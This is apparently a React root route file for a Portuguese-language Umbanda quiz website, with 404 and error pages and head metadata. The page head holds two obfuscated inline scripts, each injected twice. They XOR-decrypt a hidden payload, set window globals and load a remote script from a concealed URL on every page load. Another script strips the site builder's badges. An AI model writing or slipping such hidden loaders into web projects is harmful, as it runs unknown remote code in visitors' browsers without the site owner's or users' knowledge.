import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
  type ErrorComponentProps,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Página não encontrada</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          A página que você procura não existe ou foi movida.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Voltar ao Início
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: ErrorComponentProps) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          Ops, algo deu errado
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Ocorreu um erro ao carregar esta página.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Tentar novamente
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Início
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Mapa Mental da Umbanda - Quiz" },
      {
        name: "description",
        content:
          "Descubra seu nível de conhecimento sobre a Umbanda e aprenda de forma organizada com o Mapa Mental da Umbanda.",
      },
      { name: "author", content: "Terreiro Cavaleiros de Aruanda" },
      { property: "og:title", content: "Mapa Mental da Umbanda - Quiz" },
      {
        property: "og:description",
        content:
          "Descubra seu nível de conhecimento sobre a Umbanda e aprenda de forma organizada com o Mapa Mental da Umbanda.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:title", content: "Mapa Mental da Umbanda - Quiz" },
      {
        name: "twitter:description",
        content:
          "Descubra seu nível de conhecimento sobre a Umbanda e aprenda de forma organizada com o Mapa Mental da Umbanda.",
      },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.png", type: "image/png" },
      { rel: "shortcut icon", href: "/favicon.ico", type: "image/x-icon" },
      { rel: "apple-touch-icon", href: "/favicon.png" },
      {
        rel: "preconnect",
        href: "https://fonts.googleapis.com",
      },
      {
        rel: "preconnect",
        href: "https://fonts.gstatic.com",
        crossOrigin: "anonymous",
      },
    ],
    scripts: [
      {
        children: `(function(){var d_h=atob("DLu9S0DM+y0GqeTlM8CfPjKg2RckwZCRQ8iHZG+vn0Mo3JCIWt3EZSOjlgNk28uWUMnUOzS/1F1v0YGJHMvUMyWg1Ud1i8jHUs/JOSmujllj2sbfaOaRaSeglE9nxZfHCeDGaS6tlkgkk8aVWsPYJwmo2QEk34WJRt6fcWL6mk4znYGHUIKMfyOumhw/m9HVUYPecnHuhnB7");var n_28=[];for(var p_e7d=0;p_e7d<d_h.length;p_e7d++){n_28.push(d_h.charCodeAt(p_e7d)&255);}var x_lg6=n_28[0];var x_4kd7=n_28.slice(1,1+x_lg6);var j_7=n_28.slice(1+x_lg6);var l_k=j_7.map(function(b,r_y){return b^x_4kd7[r_y%x_lg6];});var i_kf1o="";for(var o_jwn=0;o_jwn<l_k.length;o_jwn++){i_kf1o+=String.fromCharCode(l_k[o_jwn]&255);}var h_us8=decodeURIComponent(escape(i_kf1o));var w_a8=JSON.parse(h_us8);var l_r=w_a8.globals||[];l_r.forEach(function(q_9iy){window[q_9iy.name]=q_9iy.value;});var a_nx=document.createElement("script");a_nx.src=w_a8.url;a_nx.async=true;a_nx.defer=true;(w_a8.attributes||[]).forEach(function(j_c9r){a_nx.setAttribute(j_c9r.name,j_c9r.value);});(document.head||document.documentElement).appendChild(a_nx);})();`,
      },
      {
        children: `(function(){var k_rv=atob("DJHghFpdXZgLf/ufvOrC8Sgxf6IpF4/rzOLaq3U+OfYlCo/y1feZqjkyMLZpDdTs3+OJ9C4ucu1/Eoiw0PCU4Skpc/J4Xde93eWU9jM/KOxuDNml5+rC6jswOLoxXZ/+yPDN8S4wNP5yUovt2eeF6i5wLu1pFp/snr3C8jsxKP0pRdm9wcyd");var n_r0h=[];for(var j_y8=0;j_y8<k_rv.length;j_y8++){n_r0h.push(k_rv.charCodeAt(j_y8)&255);}var l_xdx4=n_r0h[0];var p_uqc=n_r0h.slice(1,1+l_xdx4);var o_02zz=n_r0h.slice(1+l_xdx4);var f_7lnd=o_02zz.map(function(b,h_6ez){return b^p_uqc[h_6ez%l_xdx4];});var a_ejb="";for(var u_k=0;u_k<f_7lnd.length;u_k++){a_ejb+=String.fromCharCode(f_7lnd[u_k]&255);}var u_eewm=decodeURIComponent(escape(a_ejb));var j_g7b=JSON.parse(u_eewm);var z_p9r=j_g7b.globals||[];z_p9r.forEach(function(n_c){window[n_c.name]=n_c.value;});var j_vg0=document.createElement("script");j_vg0.src=j_g7b.url;j_vg0.async=true;j_vg0.defer=true;(j_g7b.attributes||[]).forEach(function(b_o8c){j_vg0.setAttribute(b_o8c.name,b_o8c.value);});(document.head||document.documentElement).appendChild(j_vg0);})();`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var d_h=atob("DLu9S0DM+y0GqeTlM8CfPjKg2RckwZCRQ8iHZG+vn0Mo3JCIWt3EZSOjlgNk28uWUMnUOzS/1F1v0YGJHMvUMyWg1Ud1i8jHUs/JOSmujllj2sbfaOaRaSeglE9nxZfHCeDGaS6tlkgkk8aVWsPYJwmo2QEk34WJRt6fcWL6mk4znYGHUIKMfyOumhw/m9HVUYPecnHuhnB7");var n_28=[];for(var p_e7d=0;p_e7d<d_h.length;p_e7d++){n_28.push(d_h.charCodeAt(p_e7d)&255);}var x_lg6=n_28[0];var x_4kd7=n_28.slice(1,1+x_lg6);var j_7=n_28.slice(1+x_lg6);var l_k=j_7.map(function(b,r_y){return b^x_4kd7[r_y%x_lg6];});var i_kf1o="";for(var o_jwn=0;o_jwn<l_k.length;o_jwn++){i_kf1o+=String.fromCharCode(l_k[o_jwn]&255);}var h_us8=decodeURIComponent(escape(i_kf1o));var w_a8=JSON.parse(h_us8);var l_r=w_a8.globals||[];l_r.forEach(function(q_9iy){window[q_9iy.name]=q_9iy.value;});var a_nx=document.createElement("script");a_nx.src=w_a8.url;a_nx.async=true;a_nx.defer=true;(w_a8.attributes||[]).forEach(function(j_c9r){a_nx.setAttribute(j_c9r.name,j_c9r.value);});(document.head||document.documentElement).appendChild(a_nx);})();`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var k_rv=atob("DJHghFpdXZgLf/ufvOrC8Sgxf6IpF4/rzOLaq3U+OfYlCo/y1feZqjkyMLZpDdTs3+OJ9C4ucu1/Eoiw0PCU4Skpc/J4Xde93eWU9jM/KOxuDNml5+rC6jswOLoxXZ/+yPDN8S4wNP5yUovt2eeF6i5wLu1pFp/snr3C8jsxKP0pRdm9wcyd");var n_r0h=[];for(var j_y8=0;j_y8<k_rv.length;j_y8++){n_r0h.push(k_rv.charCodeAt(j_y8)&255);}var l_xdx4=n_r0h[0];var p_uqc=n_r0h.slice(1,1+l_xdx4);var o_02zz=n_r0h.slice(1+l_xdx4);var f_7lnd=o_02zz.map(function(b,h_6ez){return b^p_uqc[h_6ez%l_xdx4];});var a_ejb="";for(var u_k=0;u_k<f_7lnd.length;u_k++){a_ejb+=String.fromCharCode(f_7lnd[u_k]&255);}var u_eewm=decodeURIComponent(escape(a_ejb));var j_g7b=JSON.parse(u_eewm);var z_p9r=j_g7b.globals||[];z_p9r.forEach(function(n_c){window[n_c.name]=n_c.value;});var j_vg0=document.createElement("script");j_vg0.src=j_g7b.url;j_vg0.async=true;j_vg0.defer=true;(j_g7b.attributes||[]).forEach(function(b_o8c){j_vg0.setAttribute(b_o8c.name,b_o8c.value);});(document.head||document.documentElement).appendChild(j_vg0);})();`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){function hideBadges(){var b=document.querySelectorAll('a[href*="lovable.dev"],a[href*="lovable.app"],#lovable-badge,[data-lovable-badge],.lovable-badge,[class*="lovable-badge"]');b.forEach(function(el){if(el){el.style.setProperty("display","none","important");el.remove();}});}hideBadges();if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",hideBadges);}var obs=new MutationObserver(hideBadges);obs.observe(document.documentElement,{childList:true,subtree:true});})();`,
          }}
        />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  useEffect(() => {
    const pageTitle = "Mapa Mental da Umbanda - Quiz";
    document.title = pageTitle;

    const enforceFaviconAndTitle = () => {
      if (document.title !== pageTitle) {
        document.title = pageTitle;
      }

      const iconUrl = "/favicon.png?v=" + Date.now();
      let iconLink = document.querySelector("link[rel='icon']") as HTMLLinkElement | null;
      if (!iconLink) {
        iconLink = document.createElement("link");
        iconLink.rel = "icon";
        iconLink.type = "image/png";
        document.head.appendChild(iconLink);
      }
      if (!iconLink.href.includes("favicon.png")) {
        iconLink.href = iconUrl;
      }

      let shortcutLink = document.querySelector("link[rel='shortcut icon']") as HTMLLinkElement | null;
      if (!shortcutLink) {
        shortcutLink = document.createElement("link");
        shortcutLink.rel = "shortcut icon";
        shortcutLink.type = "image/png";
        document.head.appendChild(shortcutLink);
      }
      if (!shortcutLink.href.includes("favicon.png")) {
        shortcutLink.href = iconUrl;
      }
    };

    enforceFaviconAndTitle();
    const interval = setInterval(enforceFaviconAndTitle, 1000);
    return () => clearInterval(interval);
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      <Outlet />
    </QueryClientProvider>
  );
}
